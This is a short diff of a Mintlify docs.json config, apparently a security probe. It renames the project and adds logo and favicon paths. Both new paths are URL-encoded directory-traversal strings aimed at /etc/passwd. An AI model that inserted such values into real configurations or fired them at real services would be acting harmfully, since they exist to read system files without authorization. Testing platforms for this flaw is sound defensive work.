@@ -1,18 +1,22 @@
 {
-  "$schema": "https://mintlify.com/docs.json",
-  "name": "Probe782",
-  "theme": "mint",
-  "colors": {
-    "primary": "#000000"
-  },
-  "navigation": {
-    "groups": [
-      {
-        "group": "Home",
-        "pages": [
-          "index"
-        ]
-      }
+ "$schema": "https://mintlify.com/docs.json",
+ "name": "Probe797",
+ "theme": "mint",
+ "colors": {
+  "primary": "#000000"
+ },
+ "navigation": {
+  "groups": [
+   {
+    "group": "Home",
+    "pages": [
+     "index"
     ]
-  }
+   }
+  ]
+ },
+ "logo": {
+  "light": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+ },
+ "favicon": "..%5c..%5c..%5c..%5cetc%5cpasswd"
 }
